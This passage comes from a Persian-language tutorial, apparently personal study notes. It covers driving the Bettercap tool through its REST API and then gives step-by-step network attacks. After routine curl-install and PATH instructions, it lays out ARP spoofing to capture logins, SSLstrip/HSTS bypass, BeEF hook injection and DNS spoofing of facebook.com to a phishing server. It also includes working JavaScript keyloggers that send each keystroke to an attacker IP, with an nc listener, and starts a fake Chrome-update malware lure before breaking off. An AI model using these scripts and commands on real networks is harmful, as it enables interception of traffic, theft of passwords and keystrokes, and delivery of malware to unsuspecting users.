4. **نصب Curl در ویندوز - روش دوم بوسیله فایل نصبی ابزار:**
	- روش دیگر نصب `curl` در ویندوز هم دانلود فایل اجرای ابزار و سپس اضافه کردن آن به مسیر PATH سیستم است که کمی زمانبر تر نسبت به روش قبلیست:
	1. **قدم 1: دانلود ابزار:**
		1. به صفحه دانلود `curl` میرویم: https://curl.se/windows/
		2. نسخه مناسب برای معماری سیستم خود (معمولاً 64 بیتی) را دانلود میکنیم و فایل زیپ دانلود شده را استخراج میکنیم.
	2. **قدم 2: انتقال ابزار به مسیری مشخص:**
		1. فایل `curl.exe` را در پوشه‌ ای قرار میدهیم (مثلاً `C:\curl\bin`).
	3. **قدم 3: اضافه کردن مسیر پوشه حاوی `curl.exe` به متغیر محیطی `PATH`**
		1. حال باید مسیر این پوشه را به متغیر محیطی `PATH` سیستم خود اضافه کنیم. 
		2. ساده ترین روش برای اینکار باز کردن CMD با دسترسی Administrator و سپس اجرای یکی از کامندهای زیر است:
			1. `setx /M PATH "%PATH%;C:\curl\bin"`
			2. OR - یا 
			3. `setx PATH "%PATH%;C:\curl\bin"`
	4. **نکته: سایر روش های اضافه کردن مسیر به متغیر محیطی PATH** 
		1. برای اضافه کردن یک مسیر به متغیر محیطی PATH روش های دیگری هم وجود دارند.
		2. روش هایی مانند استفاده از پنجره های تنظیمات(GUI)، کامند PowerShell و... 
		3. در توضیحات تکمیلی این سرفصل میتوانید دستورالعمل استفاده از این روش ها را به همراه توضیحات کامل درباره روش CMD که الان از آن استفاده کردیم را بصورت تفصیلی مطالعه کنید.
- **استفاده از `curl`:**
```sh
curl -X POST http://127.0.0.1:8083/api/session -d '{"module":"arp.spoof","action":"on"}'
```
- **توضیحات تکمیلی: پارامترهای `curl`:**
	- **`-X POST`**:
		- این فلگ به `curl` می‌گوید که از کدام متد HTTP برای ارسال درخواست استفاده کند.
		- متد `POST` معمولاً برای ارسال داده به سرور به منظور ایجاد یا به‌روزرسانی یک منبع استفاده می‌شود. برخلاف متد `GET` که داده‌ها را در URL ارسال می‌کند، `POST` داده‌ها را در بدنه (body) درخواست ارسال می‌کند.
	- **`http://127.0.0.1:8083/api/session`**:
		- این بخش، URL (آدرس مقصد) درخواست است که آدرس API Bettercap است.
	- `-d '{"module":"arp.spoof","action":"on"}'`:
		- این فلگ برای ارسال داده در بدنه (body) درخواست HTTP استفاده می‌شود. 
		- در واقع مقدار `'{"module":"arp.spoof","action":"on"}'` که نوعی داده JSON است مقداری است که واقعاً به سرور ارسال می‌شود و مشخص میکند که ماژول `arp.spoof` در Bettercap فعال شود.
	- **Brief Description:**
		- این دستور به `curl` می‌گوید که: یک درخواست از نوع `POST` به آدرس `http://127.0.0.1:8083/api/session` ارسال کن و در بدنه این درخواست یک شی JSON بفرست که در آن `module` برابر با `arp.spoof` و `action` برابر با `on` است.

- **توضیحات تکمیلی: روش های اضافه کردن مسیر به متغیر محیطی PATH:**
	1. **اضافه کردن مسیر به PATH Environment Variables روش CMD:**
		- روشی که در توضیحات کوتاه از آن استفاده کردیم، همین روش است که در این قسمت بصورت کامل آنرا توضیح میدهیم. برای استفاده دستورالعمل زیر را دنبال کنید:
		1. باز کردن CMD با دسترسی Administrator
			1. `WIN+R(Run) => type: cmd => press: CTRL+SHIFT+ENTER`
		2. اجرای یکی از دو کامند زیر(هر دو نیاز نیست)
		3. اضافه کردن مسیر به System PATH Variables:
			1. `setx /M PATH "%PATH%;C:\curl\bin"`
		4. اضافه کردن مسیر به User PATH Variables:
			1. `setx PATH "%PATH%;C:\curl\bin"`
		5. برای اطمینان از اضافه شدن مسیر به PATH از کامند زیر استفاده میکنیم:
			1. `echo %PATH%` 
			2. `curl --version`
	2. **اضافه کردن مسیر به PATH Environment Variables روش PowerShell:**
		1. باز کردن PowerShell با دسترسی Administrator
			1. `WIN+R(Run) => type: powershell => press: CTRL+SHIFT+ENTER`
		2. اجرای یکی از روش های زیر(هر دو نیاز نیست)
			1. اضافه کردن مسیر به System PATH Variables:
				1. `$oldPath = [Environment]::GetEnvironmentVariable('Path', 'Machine')`
				2. `$newPath = "$oldPath;C:\curl\bin"`
				3. `[Environment]::SetEnvironmentVariable('Path', $newPath, 'Machine')`
			2. اضافه کردن مسیر به User PATH Variables:
				1. `$oldPath = [Environment]::GetEnvironmentVariable('Path', 'User')`
				2. `$newPath = "$oldPath;C:\curl\bin"`
				3. `[Environment]::SetEnvironmentVariable('Path', $newPath, 'User')`
		3. پس از اجرای این دستورات، حتماً پنجره‌های ترمینال را **ببندید و دوباره باز کنید** تا تغییرات در `PATH` جدید بارگذاری شوند.
		4. برای بررسی اینکه آیا مسیر اضافه شده میتوان از کامند زیر استفاده کرد:
			1. `$env:Path -split ';' | Where-Object { $_ -like "*curl*" }`
			2. `curl --version`
	3. **اضافه کردن مسیر PATH Environment Variables روش GUI:**
		1. پنجره RUN(`WIN+R`) را باز میکنیم و  در آن `sysdm.cpl` را وارد و سپس Enter را میزنیم تا پنجره “ System Properties” باز شود.
		2. سپس به تب "Advanced" میرویم و بر روی “Environment Variables…” کلیک میکنیم.
		3. در بخش “System variables”، متغیر `Path` را پیدا کرده، انتخاب کنید و روی “Edit…” کلیک میکنیم.(البته از `Path` درون "User Variables" نیز میتوانیم استفاده کنیم)
		4. روی “New” کلیک کرده و مسیر پوشه‌ای که `curl.exe` را در آن قرار دادید (مثلاً `C:\curl\bin`) وارد کنید.
		5. تمام پنجره‌ها را با OK ببندید.
		6. حالا برای بررسی نصب در Command Prompt یا PowerShell دستور `curl --version` را اجرا میکنیم در صورت مشاهده راهنما، دستور بدرستی نصب شده است.
###### Controlling Method 2(General): `httpie`
- **ابزار `httpie` چیست؟** 
	- ابزار `httpie` یک ابزار خط فرمان است که استفاده از curl را آسان‌تر و خواناتر می‌کند. این ابزار به زبان پایتون نوشته شده و برای استفاده از آن ابتدا باید آنرا نصب کنیم. 
	- برای نصب هم از `pip install httpie` استفاده میکنیم.
	- **نکته:** `httpie` به صورت پیش‌ فرض داده‌ های ارسال شده را به عنوان JSON در نظر می‌گیرد و هدر `Content-Type: application/json` را به صورت خودکار اضافه می‌کند.
```sh
http POST http://127.0.0.1:8083/api/session 'module=arp.spoof' 'action=on'

#Force to use --json (optional)
http --json POST http://127.0.0.1:8083/api/session module=arp.spoof action=on
```
- **توضیح تکمیلی: پارامترهای `httpie`:**
	- `http POST <URL>`: 
		- دستور پایه برای ارسال درخواست POST.
	- `module=arp.spoof action=on`:
		- ابزار `httpie` به طور خودکار این جفت‌ های کلید=مقدار را به عنوان داده JSON ارسال می‌کند و هدر `Content-Type: application/json` را تنظیم می‌کند.
	- `--json`:
		- به صراحت مشخص می‌کند که داده‌ها JSON هستند.
###### Controlling Method 3(Python): `requests` Library
- **روش سوم(پایتون):** کتابخانه `requests` پایتون
	- کتابخانه `requests` استانداردی طلایی برای ارسال درخواست‌های HTTP در پایتون است.
	- این کتابخانه یک External Library یا کتابخانه خارجی است، بنابراین برای استفاده از آن ابتدا باید آنرا نصب کنیم. برای اینکار از کامند `pip install requests` استفاده میکنیم.
```python
import requests
import json

url = "http://127.0.0.1:8083/api/session"
payload = {"module": "arp.spoof", "action": "on"}
headers = {'Content-Type': 'application/json'}

try:
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    response.raise_for_status()  #Check HTTP Errors(4xx or 5xx)
    print("Request successful!")
    print("Status Code:", response.status_code)
    print("Response Body:", response.json()) #If response is JSON
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")

```

- **توضیحات تکمیلی: کدهای روش سوم کتابخانه `requests`:**
	- `requests.post(url, data=json.dumps(payload), headers=headers)`:
		- این تابع درخواست HTTP متد POST را به URL مشخص شده ارسال می‌کند.
	- `data=json.dumps(payload)`:
		- داده‌های JSON را به رشته JSON تبدیل کرده و در بدنه درخواست قرار می‌دهد.
	- `headers=headers`:
		- نوع محتوا را به عنوان `application/json` تنظیم می‌کند که برای API ها بسیار مهم است.
	- `response.raise_for_status()`:
		- اگر سرور با خطایی (مثلاً 404 Not Found یا 500 Internal Server Error) پاسخ دهد، این خط یک استثنا Exception ایجاد می‌کند.
	- `response.json()`:
		- اگر پاسخ JSON باشد، آنرا به یک دیکشنری پایتون تبدیل می‌کند.
###### Controlling Method 4(Python): `urllib` Library
- **روش چهارم(پایتون) - حالت اول:** کتابخانه `urllib` در اسکریپت پایتون
	- کتابخانه `urllib` یک کتابخانه داخلی پایتون است و بنابراین بدون نیاز به نصب میتوانیم از آن برای ارسال درخواست های HTTP استفاده کنیم.
	- از ویژگی های این کتابخانه سرعت بالا، و همچنین استفاده مستقیم آن در ترمینال است(البته ویژگی اجرای مستقیم در ترمینال برای سایر کتابخانه های پایتون نیز تصدیق میکند اما `urllib` بدلیل خوانایی بالا اینکار را ساده تر میکند.)
```python
import urllib.request, json 

data = json.dumps({'module':'arp.spoof','action':'on'}).encode('utf-8')

req = urllib.request.Request('http://127.0.0.1:8083/api/session', data=data, method='POST', headers={'Content-Type': 'application/json'})

urllib.request.urlopen(req)
```
- **روش چهارم(پایتون) - حالت دوم:** - اجرای مستقیم `urllib` در ترمینال
	- با استفاده از فلگ `c-` در کامند `python` میتوانیم کدهای پایتون را مستقیما از ترمینال اجرا کنیم. 
	- نکته ای که هست باید تمامی کدها را به حالت تک خطی One Liner بنویسیم که در پایتون برای اینکار کافیست در آخر هر خط از `;` استفاده کنیم.
```sh
python -c "import urllib.request, json; data = json.dumps({'module':'arp.spoof','action':'on'}).encode('utf-8'); req = urllib.request.Request('http://127.0.0.1:8083/api/session', data=data, method='POST', headers={'Content-Type': 'application/json'}); urllib.request.urlopen(req)"
```

- **توضیحات تکمیلی: کدهای روش چهارم کتابخانه `urllib`:**
	- - **`python -c "..."`**: 
		- اجرا کد پایتون به صورت مستقیم از خط فرمان
	- **`import urllib.request, json`**:
		- ماژول‌های لازم برای کار با URL ها و JSON را وارد می‌کند.
	- **`data = json.dumps({'module':'arp.spoof','action':'on'}).encode('utf-8')`**:
		- `{'module':'arp.spoof','action':'on'}`
			- ابتدا یک دیکشنری پایتون ساخته می‌شود
		- `json.dumps()`
			- سپس دیکشنری پایتون با `json.dumps()` به یک رشته JSON تبدیل می‌شود.
		- `.encode('utf-8')`
			- در نهایت با `.encode('utf-8')` به بایت تبدیل می‌شود، زیرا `urllib` داده‌ ها را به صورت بایت انتظار دارد.
	- **`req = urllib.request.Request(...)`**:
		- یک شیء `Request` ایجاد می‌کند. این شی شامل URL، داده‌ها، متد (`'POST'`) و هدرها (`{'Content-Type': 'application/json'}`) است.
	- **`urllib.request.urlopen(req)`**:
		- درخواست را ارسال کرده و پاسخ را دریافت می‌کند. (این کد فقط درخواست را ارسال می‌کند و پاسخ را چاپ نمی‌کند. 
		- برای مشاهده پاسخ، می‌توانید کد را کمی تغییر دهید، مثلاً:
		- `response = urllib.request.urlopen(req); print(response.read().decode('utf-8'))`
###### Controlling Method 5(Windows):
- **روش پنجم(ویندوز) حالت اول:** `Invoke-WebRequest`
	- کامند `Invoke-WebRequest` برای ارسال درخواست های HTTP در PowerShell ویندوز بکار میرود.
	- در بلاک کد زیر روش استفاده از `Invoke-WebRequest` در قالب کامند تک خطی آورده شده است. 
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:8083/api/session" -Method POST -Body '{"module":"arp.spoof","action":"on"}' -ContentType "application/json"
```
- **پارامترهای `Invoke-WebRequest`:**
	- **`-Uri`**: آدرس مقصد
	- **`-Method POST`**: نوع متد درخواست
	- **`-Body`**: 
		- محتوای JSON که باید داخل کوتیشن تک `' '` باشد تا PowerShell با دابل‌کوتیشن‌های داخل آن تداخل پیدا نکند.
	- **`-ContentType`**: 
		- برای اینکه سرور بفهمد داده ارسالی از نوع JSON است، حتماً باید این هدر را ست کنید.

- **روش پنجم(ویندوز) حالت دوم:** `Invoke-WebRequest` در اسکریپت
	- استفاده از `Invoke-WebRequest` در قالب اسکریپ PowerShell با مکانیزم مدیریت خطا که در سیستم های اتوماسیون بسیار پر کاربرد است.
```powershell
$url = "http://127.0.0.1:8083/api/session"
$body = '{"module":"arp.spoof","action":"on"}'
$headers = @{
    'Content-Type' = 'application/json'
}

try {
    $response = Invoke-WebRequest -Uri $url -Method POST -Body $body -Headers $headers
    Write-Host "Request successful!"
    Write-Host "Status Code:" $response.StatusCode
    
    #Process JSON Response
    $responseBodyJson = ConvertFrom-Json $response.Content
    Write-Host "Response Body:" $responseBodyJson
    #Note: if response not json we should use another parser
} catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
    #Show details if script got error
    if ($_.Exception.Response) {
        Write-Error "Status Code: $($_.Exception.Response.StatusCode)"
        Write-Error "Response Content: $($_.Exception.Response.Content)"
    }
}

```

- **روش پنجم(ویندوز) حالت سوم:** استفاده از `iwr`
	- کامند `iwr` کوتاه شده `Invoke-WebRequest` است. بنابراین روش استفاده دقیقا همانند `Invoke-WebRequest` است.
```powershell
iwr -Uri "http://127.0.0.1:8083/api/session" -Method POST -Body '{"module":"arp.spoof","action":"on"}' -ContentType "application/json"
```

- **نکته تکمیلی:**
	- ابزار **`curl`** در ویندوزهای 10 و 11 به بعد، در واقع یک _Alias_ برای `Invoke-WebRequest` است.
	- بنابراین اگر بخواهیم در این ویندوز ها از همان `curl` اصلی لینوکسی استفاده کنیم، معمولا باید `curl.exe` را فراخوانی کنیم.
###### Suggestions
- **پیشنهاد:**
	- برای کارهای روزمره و توسعه، از `httpie` استفاده کنید، زیرا از نظر خوانایی و سادگی دستورات، بهترین گزینه برای جایگزینی `curl` است.
	- در پایتون برای کار با درخواست های HTTP از `requests` استفاده کنید، زیرا امکانات بسیار زیادی دارد و تیم پشتیبانی آن بطور مداوم آنرا بروزرسانی میکنند.
	- اگر هم میخواهید اتوماسیون انجام دهید و DevOps کار کنید از `iwr` در ویندوز و `curl` در لینوکس استفاده کنید. 
	- 
###### Cheat Sheet - REST API Module
```powershell
#1: Install Curl
#1.1: Install on Debian Based Linux
sudo apt update
sudo apt install curl
#1.2: Install on Old RedHat Based Linux
sudo yum update
sudo yum install curl
#1.3: Install on New RedHat Based Linux
sudo dnf update
sudo dnf install curl

#1.4: Install on Windows using winget
winget install curl.curl #or
winget install curl 


#2: Add specific path to PATH Environment Variable
#2.1: CMD
#2.1.1: PATH in User Variables
setx PATH "%PATH%;C:\curl\bin"
#2.1.2: PATH in System Variables
setx /M PATH "%PATH%;C:\curl\bin"
#2.1.3: Check PATH
echo %PATH%

#2.2: PowerShell
#2.2.1: PATH in User Variables
$oldPath = [Environment]::GetEnvironmentVariable('Path', 'User')
$newPath = "$oldPath;C:\curl\bin"
[Environment]::SetEnvironmentVariable('Path', $newPath, 'User')
#2.2.2: PATH in System Variables
$oldPath = [Environment]::GetEnvironmentVariable('Path', 'Machine')
$newPath = "$oldPath;C:\curl\bin"
[Environment]::SetEnvironmentVariable('Path', $newPath, 'Machine')
#2.2.3: Check PATH
$env:Path -split ';' | Where-Object { $_ -like "*curl*" }

#3: Use 'curl' for Controlling Bettercap
curl -X POST http://127.0.0.1:8083/api/session -d '{"module":"arp.spoof","action":"on"}'

#4: Use 'httpie' for Controlling Bettercap
#4.1: Simple Usage:
http POST http://127.0.0.1:8083/api/session 'module=arp.spoof' 'action=on'
#4.2: Force to use --json (optional)
http --json POST http://127.0.0.1:8083/api/session module=arp.spoof action=on

#5: Use 'urllib' direct from terminal for Controlling Bettercap
python -c "import urllib.request, json; data = json.dumps({'module':'arp.spoof','action':'on'}).encode('utf-8'); req = urllib.request.Request('http://127.0.0.1:8083/api/session', data=data, method='POST', headers={'Content-Type': 'application/json'}); urllib.request.urlopen(req)"

#6: Controlling Bettercap from PowerShell
#6.1: Use 'Invoke-WebRequest' for Controlling Bettercap
Invoke-WebRequest -Uri "http://127.0.0.1:8083/api/session" -Method POST -Body '{"module":"arp.spoof","action":"on"}' -ContentType "application/json"

#6.2: Use 'iwr' for Controlling Bettercap
iwr -Uri "http://127.0.0.1:8083/api/session" -Method POST -Body '{"module":"arp.spoof","action":"on"}' -ContentType "application/json"
```
##### Bettercap: Configuration Methods
###### Caplet Files
فایل های Caplet اسکریپت‌ های قدرتمندی برای خودکارسازی حملات هستند. آن‌ها را می‌توان در مسیر `/usr/share/bettercap/caplets/` یافت. پسوند این اسکریپت ها `cap.` میباشد.

- **مثال یک Caplet سفارشی (`my_attack.cap`):**
```sh my_attack.cap
#Full and Automatic MITM Attack
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.5
arp.spoof on
http.proxy on
https.proxy on
net.sniff on
events.stream on
```
1. **استفاده از Caplet روش اول: کامند مستقیم:**
```sh
sudo bettercap -iface eth0 -caplet /path/to/my_attack.cap
```

2. **استفاده از Caplet روش دوم: در Bettercap Shell:**
```sh
#Method 2: Loading from Bettercap Shell
sudo bettercap -iface eth0
#Then in Bettercap Shell
caplet /root/block_port.cap
```

- **نکته:** فایل های Caplet نیازی به Permission اجرایی ندارد و فقط کافی است فایل قابل خواندن باشد (Permission 644 کافی است)
###### General Configuration Files
تنظیمات سراسری Bettercap در `usr/share/bettercap/bettercap.httpd.conf` و مسیر های مشابه برای هر ماژول HTTP API ذخیره می‌شود. شما می‌توانید یک CA سفارشی برای `https.proxy` خود ایجاد کنید.

- **مدیریت گواهی برای پراکسی HTTPS**
1. **مرحله اول:** ساخت CA اختصاصی
```sh
openssl genrsa -out bettercap-ca.key 2048

openssl req -x509 -new -nodes -key bettercap-ca.key -sha256 -days 3650 -out bettercap-ca.crt
```

2. **مرحله دوم:** بارگذاری در Bettercap - کامند تک خطی
```sh
sudo bettercap -iface eth0 -eval "set https.proxy.certificate /path/to/bettercap-ca.crt; set https.proxy.key /path/to/bettercap-ca.key; https.proxy on"
```
2. **مرحله دوم:** بارگذاری در Bettercap - روش عادی
```sh
sudo bettercap -iface eth0

#In Bettercap
set https.proxy.certificate /path/to/bettercap-ca.crt 
set https.proxy.key /path/to/bettercap-ca.key
https.proxy on
```
##### Bettercap: Implement Common Attacks
###### Attack 1.1: ARP Spoofing and Extract HTTP Login Credentials
- **توضیحات:**
	- **هدف:** قرار گرفتن در مسیر ارتباط بین دستگاه هدف و گیت‌وی شبکه برای مشاهده نام‌های کاربری و کلمات عبور ارسالی در بستر HTTP.
	- **پیش‌نیازها:** هیچ‌کدام.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** فعال‌سازی IP Forwarding در سیستم مهاجم
```sh
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

2. **مرحله دوم:** شروع Bettercap روی اینترفیس متصل به شبکه
```sh
sudo bettercap -iface eth0
```

3. **مرحله سوم:** شناسایی دستگاه‌های شبکه
```sh
net.probe on
sleep 5
net.show
```

4. **مرحله چهارم:** تنظیم هدف و اجرای حمله ARP Spoofing
```sh
set arp.spoof.targets 192.168.1.5   #Target IP
arp.spoof on
```

5. **مرحله پنجم:** فعال‌ سازی Sniffing(شنود) برای مشاهده ترافیک HTTP
```sh
set net.sniff.filter "tcp port 80"
net.sniff on
```

6. **مرحله ششم:** مشاهده زنده اطلاعات کاربری
```sh
http.proxy on
events.stream on
```
###### Attack 2: Get Passwords from HTTPS (Modern SSLstrip):
- **توضیحات:**
	- **هدف:** بدست آوردن رمزهای عبوری که در پروتکل HTTPS رد و بدل میشوند.
	- **پیش‌نیازها:** اجرای MITM

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای MITM و تنظیم هدف
```sh
sudo bettercap -iface eth0

set arp.spoof.targets 192.168.1.10
arp.spoof on
```

2. **مرحله دوم:** اجرای پراکسی HTTP, HTTPS
```sh
https.proxy on           #Automatic SSLstrip!
http.proxy on
```

3. **مرحله سوم:** شنود شبکه برای مشاهده ترافیک و رمز های عبور
```sh
net.sniff on
#now we can See HTTP/HTTPS Passwords
```
حالا میتوانیم رمزهای HTTPS را هم مشاهده کنیم.
###### Attack 3: HTTPS Bypassing using Modern SSLstrip(HSTS Bypassing)
- **توضیحات:**
	- **هدف:** تحلیل محتوای ترافیک HTTPS که معمولاً توسط HSTS محافظت می‌شود. این ماژول پیشرفته‌ تر از SSLstrip سنتی عمل می‌کند و میتواند برخی مکانیزم‌ های HSTS را با دستکاری دامنه دور بزند.
	- **پیش‌نیازها:** فعال بودن `arp.spoof` روی هدف.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** فعال‌سازی پراکسی HTTPS با SSLstrip داخلی
```sh
https.proxy on
set http.proxy.sslstrip true
http.proxy on
```

2. **مرحله دوم:** مشاهده درخواست‌ های HTTP که از HTTPS تنزل(Protocol Downgrade) یافته‌اند.
```sh
events.stream on
```

**توضیحات تکمیلی:**
1. **مکانیزم HSTS (HTTP Strict‑Transport‑Security):**
	1. یک Header در Response(پاسخ) است که به مرورگر می‌گوید برای وبسایت(سرور هاست) مشخص شده حتما و فقط از HTTPS استفاده کن.
	2. حال اگر مرورگر در زمان بعدی به همان دامنه متصل شود، حتی اگر درخواست به صورت HTTP ارسال شود، به صورت خودکار به HTTPS تغییر می‌کند.
	3. **هدر HSTS به شکل زیر میباشد:**
		- `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` 
		- `max‑age` مدت زمان (ثانیه) فعال بودن سیاست را تعیین می‌کند.
		- `includeSubDomains` اعمال مکانیزم بر روی تمامی زیر دامنه‌ها است.
		- `preload` برای ثبت دامنه در لیست پیش‌بارگذاری مرورگرها استفاده می‌شود.
	4. **غیر فعال کردن HSTS:**
		- اگر بخواهیم HSTS را غیرفعال کنیم، باید هدر `max‑age=0` را برگردانیم یا در مرورگر تنظیمات مربوطه را پاک کنیم.

2. **حمله HSTS Bypassing:**
	1. **کارکرد:**
		1. حملهٔ HSTS Bypassing که جز حملات MITM است باعث می‌شود این محدودیت کنار گذاشته شود و HTTP برای آن دامنه باز شود.
		2. حملات معمولاً از طریق protocol downgrade (مثلاً تغییر HTTPS به HTTP قبل از دریافت HSTS) یا دستکاری در حافظهٔ کلاینت (مانند اشکال ذخیره‌ سازی در Chrome) استفاده می‌کنند.
	2. **دفاع:**
		1. اگر سرور از HSTS Preload List بهره‌ برداری کند، امکان HSTS Bypassing تقریباً از بین می‌رود؛ چون مرورگرها قبل از برقراری اتصال، میزبان را در لیست بررسی می‌کنند.
	3. **روش های جلوگیری:**
		1. مطمئن شوید که هیچ درخواست HTTP برای میزبان‌ های با HSTS فعال نیست.
		2. مکانیزم HSTS را با `max-age` بلند تنظیم کنید.
		3. کلاینت‌ها را به‌روز نگه‌دارید تا اشکالات ذخیره‌ سازی برطرف شوند.

###### Attack 4: BeEF Hook Injection:
- **توضیحات:**
	- **فریم ورک BeEF (Browser Exploitation Framework):**
		- فریم ورک BeEF یک چارچوب تست نفوذ قدرتمند است که بر روی مرورگر های وب متمرکز شده است.
	- **کارکرد:**
		- تست نفوذگر پس از تزریق یک اسکریپت کوچک (Hook) به مرورگر هدف، کنترل کامل مرورگر را از راه دور در دست می‌گیرد. 
		- با تزریق این Hook از طریق Bettercap، می‌توانیم هر صفحه‌ ای که هدف باز می‌کند را به یک زامبی تبدیل کنیم.
		- بنابراین برای پیاده سازی این حمله نیاز به یک اسکریپت JavaScript داریم تا اسکریپت `beef_inject.js` که در واقع BeEF Hook است را به تمامی صفحات وبسایت هدف تزریق کند.
	- **پیش‌نیازها:** 
		- فریم ورک BeEF باید نصب و در حال اجرا باشد.
		- اسکریپت `beef_inject.js`

گام‌های پیاده‌سازی:
1. **مرحله اول:** راه‌اندازی BeEF و دریافت هوک
```sh
sudo beef-xss
#Now BeEF Pannel open in http://127.0.0.1:3000/ui/panel
#Default Hook URL: http://<Attacker_IP>:3000/hook.js 

```

2. **مرحله دوم:** ایجاد اسکریپت `beef_inject.js`
```javascript
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'http://192.168.1.99:3000/hook.js'; // Attacker IP
document.getElementsByTagName('head')[0].appendChild(script);
```

3. **مرحل سوم:** اجرای Bettercap و فعال‌ سازی HTTP Proxy با اسکریپت:
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
set http.proxy.script /path/to/beef_inject.js
http.proxy on

#Now we can see target in BeEF
```
حال هنگامی که هدف یک صفحه HTTP را باز کند، مرورگر او در پنل BeEF شما ظاهر خواهد شد.

**توضیحات تکمیلی:**
1. **ابزار BeEF (Browser Exploitation Framework):**
	1. **توضیحات:**
		1. فریم ورک BeEF ابزاری Open Source (متن‌ باز) برای تست نفوذ است که به متخصصان امنیت امکان می‌دهد تا کنترل و حملهٔ بر مرورگرهای هدف را از طریق XSS و سایر Vulnerability(آسیب پذیری) های وب انجام دهند. 
	2. **قابلیت ها:**
		- تست نفوذ به مرورگر
		- جمع‌آوری اطلاعات سیستم
		- اجرای کد های مخرب را از راه دور 
	3. **هدف اصلی:** 
		1. ارزیابی امنیت مرورگرهای هدف و شناسایی آسیب‌ پذیری‌ های مختلف از جمله XSS.
	4. **اجزاء:**
		- سرور (Ruby on Rails)
		- ماژول‌های افزونه‌ای (JavaScript Hook)
		- داشبورد مدیریتی
	- **استفاده رایج:** تیم‌های تست نفوذ، آموزش، و مطالعات پژوهشی.
###### Attack 5: DNS Spoofing
- **توضیحات:**
	- **هدف:** هدایت هدف به یک وبسایت جعلی بدون تغییر URL (Pharming)، حتی اگر هدف آدرس صحیح را وارد کرده باشد.
	- **پیش‌نیازها:** فعال بودن `arp.spoof` روی هدف.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** فعال‌سازی ماژول `dns.spoof` و تنظیم دامنه مقصد
```sh
#Run Bettercap
sudo bettercap -iface eth0

#in Bettercap
set dns.spoof.domains facebook.com,*.facebook.com
set dns.spoof.address 192.168.1.99  #Phishing Server IP
dns.spoof on
```
اکنون، هرگونه درخواست DNS از سمت هدف برای facebook.com، پاسخ جعلی با IP مشخص‌شده دریافت خواهد کرد.
###### Attack 6: Passive Reconnaissance
- **توضیحات:**
	- **هدف:** کشف اطلاعات شبکه بدون ایجاد کوچکترین نویز(بدون ارسال بسته) که امکان شناسایی را به شدت کاهش میدهد.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** فعال‌سازی Sniffing(شنور) غیرفعال و مشاهده رویدادها
```sh
net.sniff on
events.stream on
```
ابزار Bettercap به طور خودکار شروع به تحلیل بسته‌های در حال عبور کرده و اطلاعات میزبان‌ های جدید، سرویس‌ها، و درخواست‌های HTTP را بدون ارسال حتی یک بسته استخراج می‌کند.
###### Attack 7: Implement Keylogging in Browser - Method 1
برای پیاده سازی این حمله نیاز به اسکریپت Key Logging داریم که مخصوص مرورگر ها باشد.
- **مرحله اول:** ایجاد اسکریپت `keylogger.js`
```javascript
//Browser Keylogger
document.addEventListener('keypress', function(e) {
    var key = String.fromCharCode(e.which);
    new Image().src = 'http://192.168.1.99:8080/k?key=' + btoa(key);
});
```

2. **مرحله دوم:** اجرای Bettercap و تزریق اسکریپت
```sh
sudo bettercap -iface eth0
set http.proxy.script keylogger.js
set arp.spoof.targets 192.168.1.10
arp.spoof on
http.proxy on
```
با فشردن هر کلید توسط هدف در مرورگر، کاراکتر آن به سرور مهاجم ارسال می‌شود.

###### Attack 8: Implement Keylogging in Browser - Method 2
- **توضیحات:**
	- **هدف:** ثبت تمام کلیدهای فشرده‌ شده توسط کاربر در مرورگر و ارسال آن به سرور مهاجم.
	- **پیش‌نیازها:** سرور مهاجم برای دریافت لاگ‌ها (می‌تواند یک `netcat` ساده باشد).

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای Listener(شنونده) روی سرور مهاجم
```sh
nc -lvp 9000 > /tmp/keys.log
```

2. **مرحله دوم:** ایجاد اسکریپت `keylogger.js`
```javascript
document.addEventListener('keydown', function(event) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://192.168.1.99:9000/?k=' + encodeURIComponent(event.key), true);
    xhr.send();
});
```

3. **مرحله سوم:** اجرای Bettercap و تزریق اسکریپت
```sh
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.5
arp.spoof on
set http.proxy.script /path/to/keylogger.js
http.proxy on
```
با فشردن هر کلید توسط هدف در مرورگر، کاراکتر آن به سرور مهاجم ارسال می‌شود.
###### Attack 9: Silent Phishing with DNS Spoofing + HTTP Server
- **توضیحات:**
	- **کارکرد:** 
		- در این حمله هنگامی که کاربر آدرس `update.googleapis.com` یا `dl.google.com` را وارد می‌کند، به جای سرور اصلی گوگل، یک صفحه به‌روزرسانی جعلی حاوی بدافزار روی سرور مشخص شده را مشاهده کند.
		- سپس فایل `index.html` که بصورت خودکار باز میشود، یک فایل اجرایی EXE را بصورت خودکار دانلود میکند.
		- کاربر هم که فکر میکند فایل مربوط، فایل بروزرسانی گوگل است آنرا نصب میکند.
	- **پیش‌نیازها:** 
		1. فایل اجرایی `ChromeUpdate.exe` که قرار است در سیستم تارگت اجرا شود. این فایل باید در مسیر `/var/www/phishing/ChromeUpdate.exe` قرار گیرد.
		2. فایل `index.html` که وظیفه شروع دانلود فایل اجرایی را بر عهده دارد. این فایل هم باید در مسیر `/var/www/phishing/index.html` قرار گیرد.
-------

**گام های پیش نیاز:**
1. **پیش نیاز اول - روش اول:** ساخت فایل اجرایی `ChromeUpdate.exe` - روش اول فایل EXE با PowerShell
	1. برای اهداف آموزشی، یک فایل اجرایی ساده می‌سازیم که صرفاً یک پیام نمایش می‌دهد. این فایل را می‌توان با ابزارهای مختلفی ساخت. 
	2. در روش اول از یک اسکریپت PowerShell (برای ویندوز) که به EXE تبدیل می‌شود استفاده میکنیم و در روش دوم از یک اسکریپت Bash (برای لینوکس) استفاده می‌کنیم.
	3. نکته: در یک سناریوی واقعی، این فایل اجرایی بجای نمایش پیام، یک Malware (بدافزار) را در پس‌زمینه نصب میکند.
```powershell
#File: Create-TestEXE.ps1

$SourceCode = @'
using System;
